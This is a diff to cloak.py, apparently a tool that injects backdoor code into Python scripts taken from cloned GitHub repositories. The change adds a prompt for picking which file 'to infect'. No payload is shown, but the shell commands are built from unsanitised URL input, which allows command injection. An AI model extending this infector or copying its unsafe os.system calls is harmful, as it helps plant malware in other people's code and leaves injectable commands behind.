@@ -76,15 +76,30 @@ def github(script):
     directory = repo.split('/')[4] # Extracts repo name from github URL
     cwd = os.path.dirname(os.path.abspath(__file__)) # Finds the path of cloak.py
     os.system('git clone %s %s/%s -q' % (repo, cwd, directory)) # clones the repo
-    os.system('cd %s && ls > temp.txt' % directory) # Navigate to cloned repo and do ls and store its output in temp.txt
+    os.system('cd %s/%s && ls > temp.txt' % (cwd, directory)) # Navigate to cloned repo and do ls and store its output in temp.txt
     python_files = [] # we will store the found python files here
-    with open('%s/temp.txt' % directory, 'r') as f: # reading tmp.txt
+    with open('%s/%s/temp.txt' % (cwd, directory), 'r') as f: # reading tmp.txt
         for line in f:
             if '.py' in line: # if a file contains .py
                 python_files.append(line.strip('\n')) # adding the filename to python_files list
-
+    print len(python_files)
     if len(python_files) == 0: # if there are 0 python files
         print '%s No python file found.' % bad
+        yes_no = raw_input('%s Would you like to manually select a file? [Y/n] ' % info).lower()
+        if yes_no == 'n':
+            quit()
+        else:
+            os.system('cd %s/%s && ls > temp.txt' % (cwd, directory)) # Navigate to cloned repo and do ls and store its output in temp.txt
+            all_files = [] # we will store all files here
+            with open('%s/%s/temp.txt' % (cwd, directory), 'r') as f: # reading tmp.txt
+                for line in f:
+                    all_files.append(line.strip('\n')) # adding the filename to python_files list
+            number = 1
+            for file in all_files:
+                print '%s. %s' % (number, file) # it will print all files like 1. main.py 2. run.sh 3. test.txt
+                number = number + 1
+            number = raw_input('%s Select a file to infect: ' % que) # asking the user to select a file to inject
+            script = all_files[int(number) - 1] # just simple maths to select the chosen file from all_files list
 
     elif len(python_files) > 1: # if there are more than 1 python files
         print '%s More than one python scripts found.'
